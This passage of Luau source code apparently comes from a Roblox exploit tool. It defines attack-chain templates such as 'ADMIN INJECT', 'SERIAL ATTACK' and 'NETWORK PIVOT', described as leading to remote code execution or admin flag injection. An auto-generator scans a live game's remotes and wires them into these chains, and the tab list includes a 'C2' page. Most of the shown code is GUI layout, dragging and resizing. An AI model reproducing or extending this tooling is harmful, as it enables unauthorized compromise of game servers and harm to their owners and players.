                { id="REMOTE", ai=2, x=200, y=90, path=tgt and tgt.path or "" },
                { id="REMOTE", ai=1, x=370, y=90, path=nxt and nxt.path or "" },
                { id="HTTP",   ai=1, x=540, y=90, val="" },
            }, {{1,2},{2,3},{3,4}}
        end,
    },
}

-- -- HPDC CHAIN TEMPLATES ------------------------------------------------------
HTTP.gen.hpdcTemplates = {
    { strategy="FULL CHAIN",
      desc="Complete INGRESS->SERIAL->INTERSERVICE->REFLECT->LRCE pipeline",
      nodes={{id="INGRESS",ai=1},{id="SERIAL",ai=1},{id="INTERSERVICE",ai=1},
             {id="REFLECT",ai=1},{id="LRCE",ai=1}} },
    { strategy="RAPID INGRESS",
      desc="Short path: INGRESS->REFLECT->LRCE -- bypasses serialization layer",
      nodes={{id="INGRESS",ai=2},{id="REFLECT",ai=3},{id="LRCE",ai=1}} },
    { strategy="SERIAL ATTACK",
      desc="Targets deserialization: INGRESS->SERIAL->REFLECT->LRCE",
      nodes={{id="INGRESS",ai=1},{id="SERIAL",ai=3},{id="REFLECT",ai=1},{id="LRCE",ai=2}} },
    { strategy="ADMIN INJECT",
      desc="Direct admin flag injection via INGRESS->LRCE",
      nodes={{id="INGRESS",ai=4},{id="LRCE",ai=1}} },
    { strategy="NETWORK PIVOT",
      desc="Lateral pivot: INGRESS->INTERSERVICE->REFLECT->LRCE",
      nodes={{id="INGRESS",ai=2},{id="INTERSERVICE",ai=2},{id="REFLECT",ai=4},{id="LRCE",ai=3}} },
    { strategy="DESYNC CHAIN",
      desc="State desynchronisation: INGRESS->SERIAL->INTERSERVICE->LRCE",
      nodes={{id="INGRESS",ai=3},{id="SERIAL",ai=2},{id="INTERSERVICE",ai=3},{id="LRCE",ai=4}} },
    { strategy="SCOPE LEAK",
      desc="Environment escape: INGRESS->SERIAL->REFLECT(dynamic setter)->LRCE",
      nodes={{id="INGRESS",ai=1},{id="SERIAL",ai=4},{id="REFLECT",ai=4},{id="LRCE",ai=5}} },
    { strategy="BROADCAST FLOOD",
      desc="Framework broadcast abuse: INGRESS->INTERSERVICE->REFLECT->LRCE",
      nodes={{id="INGRESS",ai=5},{id="INTERSERVICE",ai=4},{id="REFLECT",ai=2},{id="LRCE",ai=2}} },
}

-- Find node type data by id
function HTTP.gen:getType(id, isHPDC)
    local list = isHPDC and HPDC_NODE_TYPES or NODE_TYPES
    for _, t in ipairs(list) do
        if t.id == id then return t end
    end
    return nil
end

-- Apply a generated set to the active graph
function HTTP.gen:apply(setIdx)
    local s = self.sets[setIdx]
    if not s then return end

    -- Switch to the right graph context
    local isHPDC = (s.tab == "HPDC")
    if isHPDC then
        activateGraphCtx("HPDC", hpdcCtx)
    else
        activateGraphCtx("SS", ssCtx)
    end

    -- Clear current graph
    for _, n in ipairs(graphNodes) do
        if n.frame then pcall(function() n.frame:Destroy() end) end
    end
    for _, w in ipairs(graphWires) do
        if w.frame then pcall(function() w.frame:Destroy() end) end
    end
    graphNodes = {}
    graphWires = {}

    -- Spawn nodes
    local NODE_W = 140
    local NODE_H = 80
    local GAP    = NODE_W + 60
    local BASE_Y = 90
    local spawnedNodes = {}

    for i, nc in ipairs(s.nodes) do
        local td   = HTTP.gen:getType(nc.id, isHPDC)
        if not td then
            td = isHPDC and HPDC_NODE_TYPES[1] or NODE_TYPES[1]
        end
        local cx = 30 + (i-1)*GAP
        local cy = BASE_Y
        local node = spawnNode(td, cx, cy)
        if node then
            -- Set selected action AND update the visible action label on the node
            if nc.ai and td.actions and td.actions[nc.ai] then
                node.selectedAction = td.actions[nc.ai]
                -- Update the "Right-click to configure" label to show the action
                if node.actionLbl then
                    node.actionLbl.Text          = td.actions[nc.ai].n
                    node.actionLbl.TextColor3    = GC.MID
                    node.actionLbl.TextTransparency = 0
                end
                -- Glow the node to show it's configured (stateGlow is UIStroke)
                if node.stateGlow then
                    local acc2 = ROLE_ACC[td.role] or GC.MID
                    TweenService:Create(node.stateGlow,TweenInfo.new(0.15),{
                        Color        = acc2,
                        Transparency = 0.20,
                    }):Play()
                end
            end

            -- Fill input value for INPUT/HTTP nodes and update visible label
            if nc.val and nc.val ~= "" then
                node.inputValue = nc.val
                -- Try to set on any TextBox child (INPUT nodes have one)
                for _, ch in ipairs(node.frame:GetDescendants()) do
                    if ch:IsA("TextBox") and ch.PlaceholderText ~= "" then
                        ch.Text = nc.val; break
                    end
                end
                -- Show value in actionLbl if no action was set separately
                if node.selectedAction == nil and node.actionLbl then
                    node.actionLbl.Text       = nc.val:sub(1,48)
                    node.actionLbl.TextColor3 = GC.MID
                end
            end

            -- Set remote/bindable instance directly from stored ref or path walk
            if nc.path and nc.path ~= "" then
                node.inputValue = nc.path

                -- Prefer the Instance ref embedded at generate time
                if nc.inst then
                    node.targetInst = nc.inst
                else
                    -- Fallback: walk the service hierarchy from path segments
                    local ok, inst = pcall(function()
                        local parts = {}
                        for seg in nc.path:gmatch("[^.]+") do
                            table.insert(parts, seg)
                        end
                        -- Try common roots first
                        local roots = {
                            game:GetService("ReplicatedStorage"),
                            game:GetService("ReplicatedFirst"),
                            workspace,
                        }
                        for _, root in ipairs(roots) do
                            local ok2, descs = pcall(function()
                                return root:GetDescendants()
                            end)
                            if ok2 then
                                for _, d in ipairs(descs) do
                                    if instancePath(d) == nc.path then
                                        return d
                                    end
                                end
                            end
                        end
                    end)
                    if ok and inst then node.targetInst = inst end
                end

                -- Show remote name + action in label
                if node.actionLbl then
                    local shortName = nc.path:match("([^.]+)$") or nc.path
                    local prefix = (node.selectedAction and
                        node.selectedAction.n .. "  >  ") or ""
                    node.actionLbl.Text       = prefix .. shortName
                    node.actionLbl.TextColor3 = GC.MID
                end
            end

            table.insert(spawnedNodes, node)
        end
    end

    -- Create wires
    for _, wireDef in ipairs(s.wires) do
        local fromNode = spawnedNodes[wireDef[1]]
        local toNode   = spawnedNodes[wireDef[2]]
        if fromNode and toNode then
            local wf = makeWire()
            table.insert(graphWires, { from=fromNode, to=toNode, frame=wf })
        end
    end

    refreshWires()

    -- Update context
    if isHPDC then
        hpdcCtx.nodes = graphNodes
        hpdcCtx.wires = graphWires
    else
        ssCtx.nodes = graphNodes
        ssCtx.wires = graphWires
    end

    -- Update switcher UI
    self:updateSwitcherUI()
end

-- Mark current set as dumped, advance to next valid set
function HTTP.gen:dump()
    self.dumped[self.current] = true
    -- Find next non-dumped set
    local start = self.current
    for i = 1, #self.sets do
        local next = (self.current % #self.sets) + 1
        self.current = next
        if not self.dumped[next] then break end
    end
    self:apply(self.current)
end

-- Build N sets from templates, alternating S->S and HPDC based on tab flag
function HTTP.gen:generate(count, ssEnabled, hpdcEnabled)
    self.sets   = {}
    self.dumped = {}
    self.current = 1

    -- Fresh remote scan
    local remotes, bindables = HTTP.gen:scanAll()

    -- Build S->S sets
    if ssEnabled then
        for i = 1, count do
            local tmpl = HTTP.gen.ssTemplates[((i-1) % #HTTP.gen.ssTemplates)+1]
            local nodes, wires = tmpl.build(remotes, bindables, i)
            -- Embed actual Instance refs into node configs for reliable apply()
            for _, nc in ipairs(nodes) do
                if nc.path and nc.path ~= "" then
                    for _, rem in ipairs(remotes) do
                        if rem.path == nc.path then
                            nc.inst = rem.inst; break
                        end
                    end
                    if not nc.inst then
                        for _, bnd in ipairs(bindables) do
                            if bnd.path == nc.path then
                                nc.inst = bnd.inst; break
                            end
                        end
                    end
                end
            end
            table.insert(self.sets, {
                tab      = "SS",
                strategy = tmpl.strategy,
                desc     = tmpl.desc,
                nodes    = nodes,
                wires    = wires,
            })
        end
    end

    -- Build HPDC sets
    if hpdcEnabled then
        for i = 1, count do
            local tmpl = HTTP.gen.hpdcTemplates[((i-1) % #HTTP.gen.hpdcTemplates)+1]
            -- Convert HPDC template nodes to position-aware format
            local nodes = {}
            local wires = {}
            for j, nc in ipairs(tmpl.nodes) do
                table.insert(nodes, { id=nc.id, ai=nc.ai, x=0, y=0, val="", path="" })
                if j > 1 then table.insert(wires, {j-1, j}) end
            end
            table.insert(self.sets, {
                tab      = "HPDC",
                strategy = tmpl.strategy,
                desc     = tmpl.desc,
                nodes    = nodes,
                wires    = wires,
            })
        end
    end

    -- Apply the first set immediately
    if #self.sets > 0 then
        self:apply(1)
        self:showSwitcher()
    end
end

-- Update the switcher label
function HTTP.gen:updateSwitcherUI()
    if not self.switcherFrm then return end
    local s = self.sets[self.current]
    local total = #self.sets
    local dumped = 0
    for _ in pairs(self.dumped) do dumped = dumped + 1 end

    if self.genLbl   then
        self.genLbl.Text = "GEN  "..self.current.." / "..total
            .."  ["..dumped.." dumped]"
    end
    if self.stratLbl and s then self.stratLbl.Text = s.strategy end
    if self.descLbl  and s then self.descLbl.Text  = s.desc     end
end

-- Show the switcher panel (floating, top of screen)
function HTTP.gen:showSwitcher()
    if self.switcherFrm then self.switcherFrm:Destroy() end

    local PW,PH = 420, 72
    local FR = Color3.fromRGB(255,60,80)
    local GRN= Color3.fromRGB(0,210,110)
    local DIM= Color3.fromRGB(55,60,80)
    local SEP= Color3.fromRGB(32,36,52)

    local f = mF(ScreenGui, 0,0, PW,PH, Color3.new(0,0,0),0.15,88)
    f.Position = UDim2.new(0.5,-PW/2, 0, 8)
    mC(f,6) mS(f,FR,0.40,1) mGlow(f,FR,0.55,2)
    self.switcherFrm = f

    -- Top accent
    mF(f,0,0,PW,2,FR,0.0,89)

    -- Left accent bar
    mF(f,0,0,3,PH,FR,0.0,89)

    mL(f,10,2,100,12,"CHAIN GENERATOR",
        Enum.Font.GothamBold,7,Color3.fromRGB(100,30,40),
        Enum.TextXAlignment.Left,89)

    self.genLbl = mL(f,10,14,280,16,"GEN  1 / 0",
        Enum.Font.GothamBold,10,FR,Enum.TextXAlignment.Left,89)

    self.stratLbl = mL(f,10,30,280,12,"--",
        Enum.Font.GothamBold,8,Color3.fromRGB(215,220,240),
        Enum.TextXAlignment.Left,89)

    self.descLbl = mL(f,10,44,280,14,"--",
        Enum.Font.Gotham,7,DIM,Enum.TextXAlignment.Left,89)

    -- < prev button
    local prevBtn = mBtn(f,296,8,28,56,Color3.new(0,0,0),1,89)
    mC(prevBtn,4) mS(prevBtn,SEP,0.55,1)
    mL(prevBtn,0,0,28,56,"<",Enum.Font.GothamBold,12,DIM,
        Enum.TextXAlignment.Center,90)
    prevBtn.MouseEnter:Connect(function()
        prevBtn.BackgroundColor3=FR; prevBtn.BackgroundTransparency=0.85
    end)
    prevBtn.MouseLeave:Connect(function() prevBtn.BackgroundTransparency=1 end)
    prevBtn.MouseButton1Click:Connect(function()
        if #self.sets == 0 then return end
        self.current = ((self.current-2) % #self.sets)+1
        self:apply(self.current)
    end)

    -- > next button
    local nextBtn = mBtn(f,328,8,28,56,Color3.new(0,0,0),1,89)
    mC(nextBtn,4) mS(nextBtn,SEP,0.55,1)
    mL(nextBtn,0,0,28,56,">",Enum.Font.GothamBold,12,DIM,
        Enum.TextXAlignment.Center,90)
    nextBtn.MouseEnter:Connect(function()
        nextBtn.BackgroundColor3=FR; nextBtn.BackgroundTransparency=0.85
    end)
    nextBtn.MouseLeave:Connect(function() nextBtn.BackgroundTransparency=1 end)
    nextBtn.MouseButton1Click:Connect(function()
        if #self.sets == 0 then return end
        self.current = (self.current % #self.sets)+1
        self:apply(self.current)
    end)

    -- APPLY button
    local applyBtn = mBtn(f,360,8,28,26,Color3.new(0,0,0),1,89)
    mC(applyBtn,4) mS(applyBtn,GRN,0.50,1)
    mL(applyBtn,0,0,28,26,"[OK]",Enum.Font.GothamBold,10,GRN,
        Enum.TextXAlignment.Center,90)
    applyBtn.MouseEnter:Connect(function()
        applyBtn.BackgroundColor3=GRN; applyBtn.BackgroundTransparency=0.82
    end)
    applyBtn.MouseLeave:Connect(function() applyBtn.BackgroundTransparency=1 end)
    applyBtn.MouseButton1Click:Connect(function()
        self:apply(self.current)
    end)

    -- DUMP button
    local dumpBtn = mBtn(f,360,38,28,26,Color3.new(0,0,0),1,89)
    mC(dumpBtn,4) mS(dumpBtn,FR,0.50,1)
    mL(dumpBtn,0,0,28,26,"x",Enum.Font.GothamBold,10,FR,
        Enum.TextXAlignment.Center,90)
    dumpBtn.MouseEnter:Connect(function()
        dumpBtn.BackgroundColor3=FR; dumpBtn.BackgroundTransparency=0.82
    end)
    dumpBtn.MouseLeave:Connect(function() dumpBtn.BackgroundTransparency=1 end)
    dumpBtn.MouseButton1Click:Connect(function()
        self:dump()
    end)

    -- Close
    local closeBtn = mBtn(f,PW-20,2,16,16,Color3.new(0,0,0),1,89)
    mL(closeBtn,0,0,16,16,"x",Enum.Font.GothamBold,9,DIM,
        Enum.TextXAlignment.Center,90)
    closeBtn.MouseButton1Click:Connect(function()
        f:Destroy(); self.switcherFrm=nil
    end)

    self:updateSwitcherUI()
end

-- Show the generation prompt modal
function HTTP.gen:showPrompt()
    -- Prevent duplicate prompts
    local existing = ScreenGui:FindFirstChild("ChainGenPrompt")
    if existing then existing:Destroy() end

    local PW,PH = 360,210
    local FR = Color3.fromRGB(255,60,80)
    local GRN= Color3.fromRGB(0,210,110)
    local BLU= Color3.fromRGB(60,155,240)
    local DIM= Color3.fromRGB(55,60,80)

    local f = mF(ScreenGui, 0,0, PW,PH, Color3.fromRGB(8,9,15),0.10,92)
    f.Name     = "ChainGenPrompt"
    f.Position = UDim2.new(0.5,-PW/2, 0.5,-PH/2)
    mC(f,8) mS(f,FR,0.40,1) mGlow(f,FR,0.55,2)

    -- Header (also the drag handle)
    local phdr = mF(f,0,0,PW,32,Color3.new(0,0,0),1,93)
    phdr.Size  = UDim2.new(1,0,0,32)
    mF(f,0,0,PW,2,FR,0.0,93)
    mF(f,0,0,3,PH,FR,0.0,93)
    mL(phdr,10,4,PW-28,14,"AUTO CHAIN GENERATOR",
        Enum.Font.GothamBold,10,FR,Enum.TextXAlignment.Left,94)
    mL(phdr,10,19,PW-28,11,"Generates pre-built node chains from live remote scan.",
        Enum.Font.Gotham,7,DIM,Enum.TextXAlignment.Left,94)

    -- Drag logic on header
    local pdA,pdSX,pdSY,pdFX,pdFY = false,0,0,0,0
    phdr.InputBegan:Connect(function(inp)
        if inp.UserInputType==Enum.UserInputType.MouseButton1 then
            pdA=true; pdSX=inp.Position.X; pdSY=inp.Position.Y
            -- Use AbsolutePosition so we start from real screen coords,
            -- not the scale-relative UDim2 offset (which would teleport the frame)
            pdFX=f.AbsolutePosition.X; pdFY=f.AbsolutePosition.Y
        end
    end)
    phdr.InputEnded:Connect(function(inp)
        if inp.UserInputType==Enum.UserInputType.MouseButton1 then pdA=false end
    end)
    local pdConn=UserInputService.InputChanged:Connect(function(inp)
        if not pdA then return end
        if inp.UserInputType~=Enum.UserInputType.MouseMovement then return end
        f.Position=UDim2.fromOffset(
            pdFX+inp.Position.X-pdSX, pdFY+inp.Position.Y-pdSY)
    end)
    f.AncestryChanged:Connect(function()
        if not f.Parent then pdConn:Disconnect() end
    end)

    -- Close
    local cx = mBtn(phdr,PW-20,6,14,14,Color3.new(0,0,0),1,94)
    mL(cx,0,0,14,14,"x",Enum.Font.GothamBold,9,DIM,
        Enum.TextXAlignment.Center,95)
    cx.MouseButton1Click:Connect(function() f:Destroy() end)

    -- "How many sets?" label
    mL(f,10,40,PW-16,12,"How many chain sets per tab?",
        Enum.Font.GothamBold,8,Color3.fromRGB(215,220,240),
        Enum.TextXAlignment.Left,93)

    -- Quick-select count buttons
    local counts = {1,3,5,8,10}
    local selectedCount = {v=5}
    local countBtns = {}
    for i, n in ipairs(counts) do
        local bx = 10 + (i-1)*54
        local b = mBtn(f,bx,56,46,22,Color3.new(0,0,0),n==5 and 0.78 or 1,93)
        mC(b,4) mS(b,FR,n==5 and 0.30 or 0.70,1)
        mL(b,0,0,46,22,tostring(n),Enum.Font.GothamBold,10,
            n==5 and FR or DIM,Enum.TextXAlignment.Center,94)
        table.insert(countBtns,{btn=b,lbl=b:FindFirstChildOfClass("TextLabel"),n=n})
        local captN=n
        b.MouseButton1Click:Connect(function()
            selectedCount.v = captN
            for _,ref in ipairs(countBtns) do
                local sel = (ref.n==captN)
                ref.btn.BackgroundTransparency = sel and 0.78 or 1
                local lbl=ref.btn:FindFirstChildOfClass("TextLabel")
                if lbl then lbl.TextColor3 = sel and FR or DIM end
                local st=ref.btn:FindFirstChildOfClass("UIStroke")
                if st then st.Transparency = sel and 0.30 or 0.70 end
            end
        end)
    end

    -- Custom number input
    mL(f,10,84,80,11,"or custom:",
        Enum.Font.Gotham,7,DIM,Enum.TextXAlignment.Left,93)
    local customBox=Instance.new("TextBox")
    customBox.Size=UDim2.fromOffset(60,18) customBox.Position=UDim2.fromOffset(82,82)
    customBox.BackgroundColor3=Color3.new(0,0,0) customBox.BackgroundTransparency=0.70
    customBox.BorderSizePixel=0 customBox.Text="" customBox.PlaceholderText="1-20"
    customBox.PlaceholderColor3=DIM customBox.TextColor3=FR
    customBox.Font=Enum.Font.Code customBox.TextSize=10
    customBox.ClearTextOnFocus=false customBox.ZIndex=93 customBox.Parent=f
    mC(customBox,3) mS(customBox,FR,0.60,1)
    customBox.FocusLost:Connect(function()
        local n=tonumber(customBox.Text)
        if n then selectedCount.v=math.clamp(math.floor(n),1,20) end
    end)

    -- Tab target toggles
    mL(f,10,110,PW-16,11,"Generate for:",
        Enum.Font.GothamBold,8,Color3.fromRGB(215,220,240),
        Enum.TextXAlignment.Left,93)

    local ssOn    = {v=true}
    local hpdcOn  = {v=true}
    local tabDefs = {
        {label="S->S",  col=BLU, state=ssOn},
        {label="HPDC",  col=Color3.fromRGB(218,155,40), state=hpdcOn},
        {label="BOTH",  col=GRN, state=nil},
    }
    for i, td in ipairs(tabDefs) do
        local bx = 10+(i-1)*80
        local b = mBtn(f,bx,124,72,22,Color3.new(0,0,0),0.78,93)
        mC(b,4) mS(b,td.col,0.40,1)
        mL(b,0,0,72,22,td.label,Enum.Font.GothamBold,8,td.col,
            Enum.TextXAlignment.Center,94)
        td.btn = b   -- store so the click handler can update all buttons
        local captTd=td
        b.MouseButton1Click:Connect(function()
            if captTd.label=="BOTH" then
                ssOn.v=true;  hpdcOn.v=true
            elseif captTd.label=="S->S" then
                ssOn.v=true;  hpdcOn.v=false   -- exclusive: S->S only
            else
                ssOn.v=false; hpdcOn.v=true    -- exclusive: HPDC only
            end
            -- Update button visuals to reflect selection
            for _, ref in ipairs(tabDefs) do
                if ref.btn then
                    local active = (ref.label=="BOTH" and ssOn.v and hpdcOn.v)
                        or (ref.label=="S->S"  and ssOn.v  and not hpdcOn.v)
                        or (ref.label=="HPDC"  and hpdcOn.v and not ssOn.v)
                    ref.btn.BackgroundTransparency = active and 0.55 or 0.85
                end
            end
        end)
    end

    -- GENERATE button
    local genBtn=mBtn(f,10,156,PW-20,38,GRN,0.82,93)
    mC(genBtn,6) mS(genBtn,GRN,0.30,1) mGlow(genBtn,GRN,0.60,2)
    mF(genBtn,0,0,3,38,GRN,0.0,94)
    mL(genBtn,10,0,PW-28,38,
        "**  GENERATE CHAINS",
        Enum.Font.GothamBold,11,GRN,Enum.TextXAlignment.Left,94)
    genBtn.MouseEnter:Connect(function()
        genBtn.BackgroundTransparency=0.60
    end)
    genBtn.MouseLeave:Connect(function()
        genBtn.BackgroundTransparency=0.82
    end)
    genBtn.MouseButton1Click:Connect(function()
        f:Destroy()
        task.spawn(function()
            HTTP.gen:generate(selectedCount.v, ssOn.v, hpdcOn.v)
        end)
    end)
end


-- Bind forward reference so build functions (defined before HTTP.gen) can call showPrompt
ssCtx.genPrompt = function() HTTP.gen:showPrompt() end

local TAB_DEFS = {
    {
        name  = "S->S",
        build = buildSourceToSinkPage,
        onActivate = function() activateGraphCtx("SS", ssCtx) end,
    },
    {
        name  = "HPDC",
        build = buildHPDCPage,
        onActivate = function() activateGraphCtx("HPDC", hpdcCtx) end,
    },
    {
        name  = "Settings",
        build = function(page)
            local l = lbl(page, CONTENT_PAD, CONTENT_PAD, 0, 0,
                "Settings tab content.",
                T.FONT_BODY, T.SIZE_BODY, T.COL_TEXT_SEC,
                Enum.TextXAlignment.Left, 5)
            l.Name = "DemoLabel"
            l.Size = UDim2.new(1, -CONTENT_PAD*2, 1, -CONTENT_PAD*2)
            l.TextYAlignment = Enum.TextYAlignment.Top
        end,
    },
    {
        name  = "Info",
        build = function(page)
            local l = lbl(page, CONTENT_PAD, CONTENT_PAD, 0, 0,
                "Info tab content.",
                T.FONT_BODY, T.SIZE_BODY, T.COL_TEXT_SEC,
                Enum.TextXAlignment.Left, 5)
            l.Name = "DemoLabel"
            l.Size = UDim2.new(1, -CONTENT_PAD*2, 1, -CONTENT_PAD*2)
            l.TextYAlignment = Enum.TextYAlignment.Top
        end,
    },
    {
        name  = "Console",
        build = buildConsolePage,
    },
    {
        name  = "C2",
        build = buildC2Page,
    },
    {
        name  = "HTTP",
        build = buildHttpFeedbackPage,
    },
    {
        name  = "DAL",
        -- Placeholder only -- DAL itself isn't defined until later in this
        -- file. The page Frame is created now (empty) and populated by
        -- DAL:init() once DAL's full definition has loaded, at the very
        -- bottom of the script. See DALPage capture below.
        build = function(page) end,
    },
}

-- TAB BAR (floating pill container)
local TAB_ROW_Y = T.TITLEBAR_H + T.TABBAR_GAP
local TabBar = frame(Panel, T.TABBAR_PAD, TAB_ROW_Y,
    panW - T.TABBAR_PAD*2, T.TABBAR_H, Color3.new(0,0,0), 1, 3)
TabBar.Name = "TabBar"

-- CONTENT AREA
local TABS_TOP = TAB_ROW_Y + T.TABBAR_H + T.TABBAR_GAP
local ContentArea = frame(Panel,
    CONTENT_PAD, TABS_TOP + CONTENT_PAD,
    panW - CONTENT_PAD*2, panH - TABS_TOP - CONTENT_PAD*2,
    T.COL_SURFACE, T.ALPHA_SURFACE, 3)
ContentArea.Name             = "ContentArea"
ContentArea.ClipsDescendants = true
corner(ContentArea, 5)
stroke(ContentArea, T.COL_BORDER, 0.70, 1)

-- BUILD TABS
local activeTab = 1
local tabBtns   = {}
local tabPages  = {}

local function setActiveTab(idx)
    activeTab = idx
    for i, b in ipairs(tabBtns) do
        local isActive = (i == idx)
        tw(b, T.TW_FAST, {
            BackgroundColor3       = isActive and T.COL_TAB_ACTIVE or T.COL_TAB_IDLE,
            BackgroundTransparency = isActive and T.ALPHA_TAB_ACT  or T.ALPHA_TAB_IDLE,
            TextColor3             = isActive and T.COL_TEXT_PRI   or T.COL_TEXT_SEC,
        })
        tabPages[i].Visible = isActive
    end
    -- Fire the tab's context-activation hook if defined
    local def = TAB_DEFS[idx]
    if def and def.onActivate then
        def.onActivate()
    end
end

for i, def in ipairs(TAB_DEFS) do
    local b = btn(TabBar, 0, 0, 0, T.TABBAR_H, T.COL_TAB_IDLE, T.ALPHA_TAB_IDLE, 4)
    b.Name           = "Tab_" .. def.name
    b.Text           = def.name
    b.Font           = T.FONT_TITLE
    b.TextSize       = T.SIZE_TAB
    b.TextColor3     = T.COL_TEXT_SEC
    b.TextXAlignment = Enum.TextXAlignment.Center
    corner(b, 6)

    b.MouseEnter:Connect(function()
        if i ~= activeTab then
            tw(b, T.TW_FAST, { BackgroundColor3 = T.COL_TAB_HOT, BackgroundTransparency = T.ALPHA_TAB_HOT })
        end
    end)
    b.MouseLeave:Connect(function()
        if i ~= activeTab then
            tw(b, T.TW_FAST, { BackgroundColor3 = T.COL_TAB_IDLE, BackgroundTransparency = T.ALPHA_TAB_IDLE })
        end
    end)
    b.MouseButton1Click:Connect(function() setActiveTab(i) end)
    tabBtns[i] = b

    local page = frame(ContentArea, 0, 0, 0, 0, Color3.new(0,0,0), 1, 4)
    page.Name    = "Page_" .. def.name
    page.Size    = UDim2.new(1, 0, 1, 0)
    page.Visible = false
    def.build(page)
    tabPages[i] = page
end

-- Set initial active tab (no tween on load)
for i, b in ipairs(tabBtns) do
    local isActive = (i == 1)
    b.BackgroundColor3       = isActive and T.COL_TAB_ACTIVE or T.COL_TAB_IDLE
    b.BackgroundTransparency = isActive and T.ALPHA_TAB_ACT  or T.ALPHA_TAB_IDLE
    b.TextColor3             = isActive and T.COL_TEXT_PRI   or T.COL_TEXT_SEC
    tabPages[i].Visible      = isActive
end

-- Capture the DAL tab's page now -- DAL itself isn't defined until later
-- in this file. This reference lets the DAL section (appended below)
-- populate the page once DAL:init() actually exists.
local DALPage = tabPages[#TAB_DEFS]

-- RESIZE GRIP (parented to PanelShell -- outside ClipsDescendants)
local GripSize = T.RESIZE_GRIP
local Grip = btn(PanelShell, panW - GripSize, panH - GripSize, GripSize, GripSize,
    T.COL_GRIP, T.ALPHA_GRIP, 6)
Grip.Name = "ResizeGrip"
corner(Grip, 3)

local function gripDot(ox, oy)
    local d = frame(Grip, ox, oy, 2, 2, T.COL_ACCENT, 0.2, 7)
    corner(d, 1)
end
gripDot(GripSize - 5,  GripSize - 5)
gripDot(GripSize - 10, GripSize - 5)
gripDot(GripSize - 5,  GripSize - 10)

-- LAYOUT REFRESH
local function refreshLayout()
    PanelShell.Position = UDim2.fromOffset(panX, panY)
    PanelShell.Size     = UDim2.fromOffset(panW, panH)
    Panel.Position      = UDim2.fromOffset(0, 0)
    Panel.Size          = UDim2.fromOffset(panW, panH)

    TitleBar.Size     = UDim2.fromOffset(panW, T.TITLEBAR_H)
    tbSquare.Size     = UDim2.fromOffset(panW, T.CORNER)
    tbSquare.Position = UDim2.fromOffset(0, T.TITLEBAR_H - T.CORNER)

    TitleLabel.Size = UDim2.fromOffset(
        panW - T.PADDING*2 - (T.BTN_SIZE + T.BTN_GAP)*2 - T.PADDING,
        T.TITLEBAR_H)

    local closeBx = panW - T.PADDING - T.BTN_SIZE
    local minBx   = panW - T.PADDING - (T.BTN_SIZE + T.BTN_GAP) - T.BTN_SIZE
    local by      = math.floor((T.TITLEBAR_H - T.BTN_SIZE) / 2)
    CloseBtn.Position = UDim2.fromOffset(closeBx, by)
    MinBtn.Position   = UDim2.fromOffset(minBx,   by)

    -- Tab pills
    local TAB_ROW_Y_ = T.TITLEBAR_H + T.TABBAR_GAP
    local tabBarW    = panW - T.TABBAR_PAD*2
    TabBar.Position  = UDim2.fromOffset(T.TABBAR_PAD, TAB_ROW_Y_)
    TabBar.Size      = UDim2.fromOffset(tabBarW, T.TABBAR_H)

    local tabCount = #tabBtns
    local totalGap = T.TAB_INNER_GAP * (tabCount - 1)
    local pillW    = math.floor((tabBarW - totalGap) / tabCount)
    for i, b in ipairs(tabBtns) do
        local tx = (i-1) * (pillW + T.TAB_INNER_GAP)
        local pw = (i == tabCount) and (tabBarW - tx) or pillW
        b.Position = UDim2.fromOffset(tx, 0)
        b.Size     = UDim2.fromOffset(pw, T.TABBAR_H)
    end

    -- Content area
    local TABS_TOP_ = TAB_ROW_Y_ + T.TABBAR_H + T.TABBAR_GAP
    local cH = panH - TABS_TOP_ - CONTENT_PAD*2
    local cW = panW - CONTENT_PAD*2
    ContentArea.Position = UDim2.fromOffset(CONTENT_PAD, TABS_TOP_ + CONTENT_PAD)
    ContentArea.Size     = UDim2.fromOffset(cW, cH)

    Grip.Position = UDim2.fromOffset(panW - GripSize, panH - GripSize)
end

-- DRAG
local dragging  = false
local dragStart = nil
local dragPanX  = 0
local dragPanY  = 0

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        dragging  = true
        dragStart = Vector2.new(input.Position.X, input.Position.Y)
        dragPanX  = panX
        dragPanY  = panY
    end
end)
TitleBar.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

-- RESIZE
local resizing    = false
local resizeStart = nil
local resizeW0    = panW
local resizeH0    = panH

Grip.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        resizing    = true
        resizeStart = Vector2.new(input.Position.X, input.Position.Y)
        resizeW0    = panW
        resizeH0    = panH
    end
end)
Grip.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        resizing = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType ~= Enum.UserInputType.MouseMovement
    and input.UserInputType ~= Enum.UserInputType.Touch then return end
    local pos = Vector2.new(input.Position.X, input.Position.Y)
    if dragging and not resizing then
        local delta = pos - dragStart
        panX = math.round(dragPanX + delta.X)
        panY = math.round(dragPanY + delta.Y)
        PanelShell.Position = UDim2.fromOffset(panX, panY)
    end
    if resizing and state == State.OPEN then
        local delta = pos - resizeStart
        panW = math.max(T.PANEL_MIN_W, math.round(resizeW0 + delta.X))
        panH = math.max(T.PANEL_MIN_H, math.round(resizeH0 + delta.Y))
        refreshLayout()
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
        resizing = false
    end
end)

-- STATE MACHINE
local function setState(newState)
    if state == State.CLOSED then return end
    state = newState

    if newState == State.MINIMIZED then
        savedH = panH
        tw(PanelShell, T.TW_SPRING, { Size = UDim2.fromOffset(panW, T.TITLEBAR_H) })
        tw(Panel,      T.TW_SPRING, { Size = UDim2.fromOffset(panW, T.TITLEBAR_H) })
        tw(ContentArea, T.TW_FAST, { BackgroundTransparency = 1 })
        tw(TabBar,      T.TW_FAST, { BackgroundTransparency = 1 })
        for _, b in ipairs(tabBtns) do
            tw(b, T.TW_FAST, { BackgroundTransparency = 1, TextTransparency = 1 })
        end
        tw(Grip, T.TW_FAST, { BackgroundTransparency = 1 })

    elseif newState == State.OPEN then
        panH = savedH
        tw(PanelShell, T.TW_SPRING, { Size = UDim2.fromOffset(panW, panH) })
        tw(Panel,      T.TW_SPRING, { Size = UDim2.fromOffset(panW, panH) })
